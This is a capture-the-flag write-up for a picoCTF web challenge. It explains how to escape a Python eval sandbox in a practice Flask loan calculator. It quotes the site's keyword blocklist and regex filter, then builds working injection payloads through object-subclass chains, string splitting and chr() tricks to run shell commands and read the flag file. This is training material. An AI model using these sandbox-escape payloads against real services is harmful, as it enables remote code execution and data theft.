**Challenge:** 3v@l

**Level:** Medium

**Challenge Author:** Theoneste Byagutangaza

### Description: 
ABC Bank's website has a loan calculator to help its clients calculate the amount they pay if they take a loan from the bank. Unfortunately, they are using an eval function to calculate the loan. Bypassing this will give you Remote Code Execution (RCE). Can you exploit the bank's calculator and read the flag?


### Step-by-Step Walkthrough:
Upon opening the webpage, you are greeted by a website with a `Bank-Loan Calculator` and some interactive buttons

1. Analyze the Filters and Blacklists
2. Explored Python Object Chains
3. Enumerated Subclasses
4. Bypassed Blacklists with Dynamic String Construction
5. Executed Commands

## Investigation - web page
All good web page vulnerability inspections will generally comprise of two things:

1. Using the Web Page Inspector
2. Testing all the interactive elements

Let's open up an inspector panel and look at the source element. We see a hint there in some comments:

```
TODO
------------
Secure python_flask eval execution by 
    1. blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
    2. Implementing regex: r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'
```

We learn some things:

```
1. The calculator is being run as a python_flask
2. They want to block all the malicious keywords
* os
* eval
* exec
* bind
* connect
* python
* socket
* ls
* cat
* shell
3. The regex also blocks certain blocks, including
* Hex (0x...)
* Unicode (\u....)
* Percent-encoding (%..)
* Dots followed by 1-3 alphanumerics (.[A-Za-z0-9]{1,3})
* Slashes and backslashes (/, \)
* Double dots (..)
```

It's good to test things, just in case. I tested all of the keywords above just on their own and it seems they did block those. However, as we've learned in other challenges, blacklisting is a bad idea as there's always another way to represent things and you might miss something, providing false confidence in your security.

##### Note - Simple Solution
After solving it, I watched some walkthroughs and I definitely made it a lot more complicated! This can be solved pretty directly with the following code. I even had the thought to initially try other functions not blacklisted, but never pursued it. However, the method I used to solve it helped me learn a lot about python classes, which may be useful for later challenges
<details><summary>HINT</summary>
    <pre>
    open(chr(47)+'flag.'+'txt').read()
    </pre>
   </details>

## Investigation - Testing Injections
Reviewing this [site](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) we can run through some test injections and we quickly see this is not the way to go. 

## Learning - Python Classes
__class__ is a special attribute in Python that refers to the class of an object. It allows you to access the type (class) of any instance.

Example:
```
x = 5
print(x.__class__)  # Output: <class 'int'>
```

Furthermore, `().__class__` in Python returns the class of an empty tuple object, which is `<class 'tuple'>`. We could use any object here, but we'll use a tuple to access its base classes and their subclasses.

## Investigation - Subclasses

Our first goal will be to get a list of all subclasses. Index into this list to find classes which can import `os` via `__init__.__globals__`, then use commands such as `cat` and `ls` in string form.

Since `os` is blacklisted, but `bracket notation` is not, our goal is to use the following:

`().__class__.__bases__[0].__subclasses__()[<index>].__init__.__globals__`

where `<index>` is the index of our class that has the method `__globals__`

* `__class__`: a special attribute in Python that refers to the class (type) of an object. It allows you to access the object's type and its class-level attributes and methods.
* `__bases__`: All new-style classes in Python (which is everything in Python 3) have an attribute that lists their base classes.
* `__subclasses__`: A special method in Python that, when called on a class, returns a list of all classes that directly inherit from it.
* `__init__`: A special method in Python classes, known as the constructor. It is automatically called when a new instance of the class is created, and is used to initialize the object’s attributes.
* `__globals__`:  A special attribute of Python function objects. It is a dictionary containing the global variables that were accessible in the module where the function was defined.

To find our index, let's list all the classes and subclasses with the following:

`().__class__.__bases__[0].__subclasses__()`

This returns a "blank" list, which seems to be sanitized output for security reasons. We know the subclasses exist though! So we still learned something.

We can try to print all the class names into a list:

`[c.__name__ for c in ().__class__.__bases__[0].__subclasses__()]`

But we want the index as well, so let's add that in:

`[(i, c.__name__) for i, c in enumerate((()).__class__.__bases__[0].__subclasses__())]`

## Investigation - Globals
There! Now that we know we can iterate, let's find a class that includes `__globals__`

`[i for i, c in enumerate((()).__class__.__bases__[0].__subclasses__()) if hasattr(c.__init__, '__globals__')]`

But now we get an error, `ls` is blocked! We aren't using `ls`, so the system must be checking that `ls` exists as any sequence of characters. Here we see that `globals` is the issue. We'll need an alternative method to represent that. Since `globals` is a string, lets just split it:

`[i for i, c in enumerate((()).__class__.__bases__[0].__subclasses__()) if hasattr(c.__init__, '__global'+'s__')]`

and we get a big long list of valid indexes! For simplicity, we'll just use index `80`.

##### Note
not all indexes are equal here, some will be simpler to implement than others. 80 turned out to be fairly straightforward

## Investigation - Import
Inputting `80` into our index:

`().__class__.__bases__[0].__subclasses__()[80].__init__.__globals__`

But this throws an error for `globals` again, let's use `getattribute()` instead. `__getattribute__` is a special method in Python that is called whenever an attribute of an object is accessed. It allows you to customize or control how attribute access works for instances of a class.

`().__class__.__bases__[0].__subclasses__()[80].__init__.__getattribute__('__global'+'s__')`

now we need the to import `os`, but we currently have a dictionary object. Let's use the `import` function

`().__class__.__bases__[0].__subclasses__()[80].__init__.__getattribute__('__global'+'s__')['__import__']('o'+'s').popen('l'+'s').read()`

Score! We can use our commands again. Let's check out what we have. Remember that `..` is a blacklisted sequence, so we need to split them up when we use them.

Thus we can see that the flag is located one directory above! Now let's use `cat`, split of course. Again, recall that there is regex checking for any sequence with a `.` and `1-3 characters` following. Split up your command appropriately:

`().__class__.__bases__[0].__subclasses__()[80].__init__.__getattribute__('__global'+'s__')['__import__']('o'+'s').popen('ca'+'t '+'/flag'+'.'+'txt').read()`

Ah, of course, the '/' is also blacklisted. This is where we'd want to use `chr`.

## Learning - chr
`chr` is a built-in Python function that returns the character corresponding to a given Unicode (ASCII) integer value.

Example:
```
chr(65)   # Returns 'A'
chr(97)   # Returns 'a'
chr(47)   # Returns '/'
```
Replace `/` with chr(47) as follows:

`().__class__.__bases__[0].__subclasses__()[80].__init__.__getattribute__('__global'+'s__')['__import__']('o'+'s').popen('ca'+'t '+chr(47)+'flag'+'.'+'txt').read()`

and we have our flag!

<details><summary>Flag</summary>
    <pre>
    picoCTF{D0nt_Use_Unsecure_f@nctions6798a2d8}
    </pre>
   </details>